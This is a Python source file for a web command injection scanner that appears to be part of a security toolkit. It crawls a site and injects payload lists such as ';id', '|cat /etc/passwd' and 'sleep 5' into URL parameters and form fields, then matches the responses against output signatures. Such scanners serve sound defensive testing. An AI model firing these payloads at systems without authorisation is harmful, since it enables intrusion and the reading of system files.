#!/usr/bin/env python3
"""
VaultScan - Command Injection Scanner
======================================
Tests URL parameters and form inputs for OS command injection
vulnerabilities using output-based detection (Linux/Windows command
output signatures) and time-based blind detection (sleep/ping delay
measurement). Crawls same-domain pages (depth-1, max 8).

Outputs JSON array of findings to stdout.
"""

import re
import sys
import os
import time
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from scan_utils import (
    is_mock_mode,
    output_findings,
    output_error,
    base_argparser,
    normalize_url,
    create_session,
    safe_request,
    rate_limited_request,
    make_finding,
    extract_forms,
    extract_url_params,
    replace_url_param,
    crawl_same_domain,
    measure_response_time,
    get_baseline_time,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
CATEGORY = "INJECTION"
TIME_THRESHOLD = 4.0  # Seconds above baseline to flag time-based injection
MAX_CRAWL_PAGES = 5
TESTABLE_INPUT_TYPES = {"text", "search", "hidden", "password", "url", "tel", "number"}

# ---------------------------------------------------------------------------
# Output-Based Payloads (22)
# ---------------------------------------------------------------------------
OUTPUT_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, target_os)
    # --- Linux id command ---
    (";id", "linux"),
    ("|id", "linux"),
    ("`id`", "linux"),
    ("$(id)", "linux"),
    ("%0aid", "linux"),
    ("||id", "linux"),
    ("&&id", "linux"),
    # --- Linux cat /etc/passwd ---
    (";cat /etc/passwd", "linux"),
    ("|cat /etc/passwd", "linux"),
    ("$(cat /etc/passwd)", "linux"),
    ("`cat /etc/passwd`", "linux"),
    # --- Windows dir ---
    ("|dir", "windows"),
    ("&dir", "windows"),
    ("||dir", "windows"),
    ("&&dir", "windows"),
    # --- Windows type win.ini ---
    ("|type C:\\windows\\win.ini", "windows"),
    ("&type C:\\windows\\win.ini", "windows"),
    # --- URL-encoded variants ---
    ("%3Bid", "linux"),
    ("%7Cid", "linux"),
    ("%60id%60", "linux"),
    ("%0a id", "linux"),
    ("%0d%0aid", "linux"),
]

# ---------------------------------------------------------------------------
# Time-Based Payloads (10)
# ---------------------------------------------------------------------------
TIME_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, target_os)
    (";sleep 5", "linux"),
    ("|sleep 5", "linux"),
    ("`sleep 5`", "linux"),
    ("$(sleep 5)", "linux"),
    ("||sleep 5", "linux"),
    ("&&sleep 5", "linux"),
    ("%0asleep 5", "linux"),
    # --- Windows ---
    ("|timeout /t 5", "windows"),
    ("&ping -n 6 127.0.0.1", "windows"),
    ("||ping -n 6 127.0.0.1", "windows"),
]

# ---------------------------------------------------------------------------
# Response Detection Patterns
# ---------------------------------------------------------------------------
COMMAND_OUTPUT_PATTERNS: List[Tuple[str, str]] = [
    # (regex, description)
    (r"uid=\d+\(?\w*\)?\s+gid=\d+", "Linux id output (uid+gid)"),
    (r"uid=\d+", "Linux id output (uid)"),
    (r"gid=\d+", "Linux id output (gid)"),
    (r"groups=\d+", "Linux id output (groups)"),
    (r"root:x:0:0", "Linux /etc/passwd (root)"),
    (r"root:\*:0:0", "Linux /etc/passwd (root BSD)"),
    (r"daemon:x:\d+:\d+", "Linux /etc/passwd (daemon)"),
    (r"Volume Serial Number", "Windows dir output"),
    (r"Directory of [A-Z]:\\", "Windows dir output"),
    (r"\[fonts\]", "Windows win.ini contents"),
    (r"\[extensions\]", "Windows win.ini contents"),
    (r"\[mci extensions\]", "Windows win.ini contents"),
]


# ---------------------------------------------------------------------------
# Detection Helpers
# ---------------------------------------------------------------------------
def _check_command_output(
    body: str,
    baseline_body: str,
) -> Optional[Tuple[str, str]]:
    """
    Compare response body against known command output patterns.
    Only triggers if the pattern was NOT in the baseline response
    (to avoid false positives on pages that naturally contain those strings).
    Returns (pattern_description, matched_text) or None.
    """
    for pattern, description in COMMAND_OUTPUT_PATTERNS:
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            # Verify the match is not already present in the baseline
            if not re.search(pattern, baseline_body, re.IGNORECASE):
                return (description, match.group(0))
    return None


# ---------------------------------------------------------------------------
# Test URL Parameters — Output-Based
# ---------------------------------------------------------------------------
def test_output_url_params(
    session,
    url: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """Test URL query parameters for output-based command injection."""
    findings: List[Dict] = []
    params = extract_url_params(url)
    if not params:
        return findings

    # Get baseline response for false-positive filtering
    baseline_resp, baseline_err = safe_request(session, "GET", url, timeout=timeout)
    baseline_body = baseline_resp.text if baseline_resp else ""

    for param_name, values in params.items():
        original_value = values[0] if values else ""
        found = False

        for payload, target_os in OUTPUT_PAYLOADS:
            injected = original_value + payload
            test_url = replace_url_param(url, param_name, injected)

            resp, err = rate_limited_request(
                session, "GET", test_url, delay=0.05, timeout=timeout,
            )
            if err or resp is None:
                continue

            detection = _check_command_output(resp.text, baseline_body)
            if detection:
                description, matched_text = detection
                findings.append(make_finding(
                    vulnerability=f"Command Injection — {description}",
                    severity="CRITICAL",
                    location=f"{url} [param: {param_name}]",
                    evidence=(
                        f"Payload '{payload}' in parameter '{param_name}' "
                        f"produced command output: {matched_text[:150]}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "output-based",
                        "parameter": param_name,
                        "payload": payload,
                        "target_os": target_os,
                        "detection": description,
                        "matched_text": matched_text[:300],
                        "status_code": resp.status_code,
                    },
                ))
                found = True
                break

        if found:
            continue  # Next parameter

    return findings


# ---------------------------------------------------------------------------
# Test URL Parameters — Time-Based
# ---------------------------------------------------------------------------
def test_time_url_params(
    session,
    url: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """Test URL query parameters for time-based command injection."""
    findings: List[Dict] = []
    params = extract_url_params(url)
    if not params:
        return findings

    baseline_time = get_baseline_time(session, url, timeout=timeout)

    for param_name, values in params.items():
        original_value = values[0] if values else ""
        found = False

        for payload, target_os in TIME_PAYLOADS:
            injected = original_value + payload
            test_url = replace_url_param(url, param_name, injected)

            time.sleep(delay)
            resp, elapsed, err = measure_response_time(
                session, "GET", test_url, timeout=max(timeout, 15),
            )
            if err:
                continue

            deviation = elapsed - baseline_time
            if deviation > TIME_THRESHOLD:
                findings.append(make_finding(
                    vulnerability="Time-Based Command Injection",
                    severity="HIGH",
                    location=f"{url} [param: {param_name}]",
                    evidence=(
                        f"Payload '{payload}' in parameter '{param_name}' "
                        f"caused {elapsed:.2f}s response "
                        f"(baseline {baseline_time:.2f}s, deviation +{deviation:.2f}s)"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "time-based",
                        "parameter": param_name,
                        "payload": payload,
                        "target_os": target_os,
                        "baseline_seconds": round(baseline_time, 3),
                        "response_seconds": round(elapsed, 3),
                        "deviation_seconds": round(deviation, 3),
                    },
                ))
                found = True
                break

        if found:
            continue

    return findings


# ---------------------------------------------------------------------------
# Test Forms — Output-Based
# ---------------------------------------------------------------------------
def test_output_forms(
    session,
    url: str,
    html: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """Test form inputs for output-based command injection."""
    findings: List[Dict] = []
    forms = extract_forms(url, html)

    for form in forms:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        # Get baseline for this form action
        baseline_resp, _ = safe_request(session, "GET", action, timeout=timeout)
        baseline_body = baseline_resp.text if baseline_resp else ""

        for inp in inputs:
            inp_type = inp.get("type", "text").lower()
            if inp_type not in TESTABLE_INPUT_TYPES:
                continue

            inp_name = inp["name"]

            # Build base form data
            base_data: Dict[str, str] = {}
            for other in inputs:
                if other["name"] == inp_name:
                    continue
                base_data[other["name"]] = other.get("value", "") or "test"

            found_vuln = False

            for payload, target_os in OUTPUT_PAYLOADS:
                form_data = {**base_data, inp_name: payload}

                if method == "POST":
                    resp, err = rate_limited_request(
                        session, "POST", action, delay=0.05, timeout=timeout,
                        data=form_data,
                    )
                else:
                    resp, err = rate_limited_request(
                        session, "GET", action, delay=0.05, timeout=timeout,
                        params=form_data,
                    )

                if err or resp is None:
                    continue

                detection = _check_command_output(resp.text, baseline_body)
                if detection:
                    description, matched_text = detection
                    findings.append(make_finding(
                        vulnerability=f"Command Injection in Form — {description}",
                        severity="CRITICAL",
                        location=f"{action} [form field: {inp_name}]",
                        evidence=(
                            f"Payload '{payload}' in form field '{inp_name}' "
                            f"({method}) produced command output: "
                            f"{matched_text[:150]}"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "output-based-form",
                            "form_action": action,
                            "form_method": method,
                            "field": inp_name,
                            "payload": payload,
                            "target_os": target_os,
                            "detection": description,
                            "matched_text": matched_text[:300],
                            "status_code": resp.status_code,
                        },
                    ))
                    found_vuln = True
                    break

            if found_vuln:
                continue

    return findings


# ---------------------------------------------------------------------------
# Test Forms — Time-Based
# ---------------------------------------------------------------------------
def test_time_forms(
    session,
    url: str,
    html: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """Test form inputs for time-based command injection."""
    findings: List[Dict] = []
    forms = extract_forms(url, html)

    for form in forms:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        baseline_time = get_baseline_time(session, action, timeout=timeout)

        for inp in inputs:
            inp_type = inp.get("type", "text").lower()
            if inp_type not in TESTABLE_INPUT_TYPES:
                continue

            inp_name = inp["name"]

            # Build base form data
            base_data: Dict[str, str] = {}
            for other in inputs:
                if other["name"] == inp_name:
                    continue
                base_data[other["name"]] = other.get("value", "") or "test"

            found_vuln = False

            for payload, target_os in TIME_PAYLOADS:
                form_data = {**base_data, inp_name: payload}
                time.sleep(delay)

                if method == "POST":
                    resp, elapsed, err = measure_response_time(
                        session, "POST", action, timeout=max(timeout, 15),
                        data=form_data,
                    )
                else:
                    resp, elapsed, err = measure_response_time(
                        session, "GET", action, timeout=max(timeout, 15),
                        params=form_data,
                    )

                if err:
                    continue

                deviation = elapsed - baseline_time
                if deviation > TIME_THRESHOLD:
                    findings.append(make_finding(
                        vulnerability="Time-Based Command Injection in Form",
                        severity="HIGH",
                        location=f"{action} [form field: {inp_name}]",
                        evidence=(
                            f"Payload '{payload}' in form field '{inp_name}' "
                            f"({method}) caused {elapsed:.2f}s response "
                            f"(baseline {baseline_time:.2f}s, +{deviation:.2f}s)"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "time-based-form",
                            "form_action": action,
                            "form_method": method,
                            "field": inp_name,
                            "payload": payload,
                            "target_os": target_os,
                            "baseline_seconds": round(baseline_time, 3),
                            "response_seconds": round(elapsed, 3),
                            "deviation_seconds": round(deviation, 3),
                        },
                    ))
                    found_vuln = True
                    break

            if found_vuln:
                continue

    return findings


# ---------------------------------------------------------------------------
# Mock Findings
# ---------------------------------------------------------------------------
def get_mock_findings(target: str) -> List[Dict]:
    """Return realistic mock findings for demonstration/testing."""
    return [
        make_finding(
            vulnerability="Command Injection — Linux id output (uid+gid)",
            severity="CRITICAL",
            location=f"{target}/ping?host=127.0.0.1 [param: host]",
            evidence=(
                "Payload ';id' in parameter 'host' produced command output: "
                "uid=33(www-data) gid=33(www-data)"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "output-based",
                "parameter": "host",
                "payload": ";id",
                "target_os": "linux",
                "detection": "Linux id output (uid+gid)",
                "matched_text": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
                "status_code": 200,
            },
        ),
        make_finding(
            vulnerability="Command Injection in Form — Linux /etc/passwd (root)",
            severity="CRITICAL",
            location=f"{target}/tools/lookup [form field: domain]",
            evidence=(
                "Payload '|cat /etc/passwd' in form field 'domain' (POST) "
                "produced command output: root:x:0:0"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "output-based-form",
                "form_action": f"{target}/tools/lookup",
                "form_method": "POST",
                "field": "domain",
                "payload": "|cat /etc/passwd",
                "target_os": "linux",
                "detection": "Linux /etc/passwd (root)",
                "matched_text": "root:x:0:0:root:/root:/bin/bash",
                "status_code": 200,
            },
        ),
        make_finding(
            vulnerability="Time-Based Command Injection",
            severity="HIGH",
            location=f"{target}/api/resolve?ip=10.0.0.1 [param: ip]",
            evidence=(
                "Payload ';sleep 5' in parameter 'ip' caused 5.41s response "
                "(baseline 0.19s, deviation +5.22s)"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "time-based",
                "parameter": "ip",
                "payload": ";sleep 5",
                "target_os": "linux",
                "baseline_seconds": 0.19,
                "response_seconds": 5.41,
                "deviation_seconds": 5.22,
            },
        ),
    ]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = base_argparser("VaultScan - Command Injection Scanner")
    args = parser.parse_args()

    target = normalize_url(args.target)

    # ---- Mock mode ----
    if is_mock_mode():
        output_findings(get_mock_findings(target))
        return

    # ---- Live scan ----
    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)
    delay = args.delay
    timeout = args.timeout
    findings: List[Dict] = []

    # Step 1: Crawl same-domain pages (depth-1, max 8)
    try:
        pages = crawl_same_domain(
            target, session, delay=0.05, timeout=timeout, max_pages=MAX_CRAWL_PAGES,
            depth=1,
        )
    except Exception:
        pages = [target]

    # Step 2: Test each discovered page
    for page_url in pages:
        # Fetch page HTML for form extraction
        resp, err = safe_request(session, "GET", page_url, timeout=timeout)
        page_html = resp.text if resp else ""

        # 2a: Output-based — URL params
        findings.extend(test_output_url_params(session, page_url, delay, timeout))

        # 2b: Output-based — forms
        if page_html:
            findings.extend(test_output_forms(session, page_url, page_html, delay, timeout))

        # 2c: Time-based — URL params
        findings.extend(test_time_url_params(session, page_url, delay, timeout))

        # 2d: Time-based — forms
        if page_html:
            findings.extend(test_time_forms(session, page_url, page_html, delay, timeout))

    # Deduplicate by (vulnerability, location)
    seen = set()
    unique_findings: List[Dict] = []
    for f in findings:
        key = (f["vulnerability"], f["location"])
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    output_findings(unique_findings)


if __name__ == "__main__":
    main()
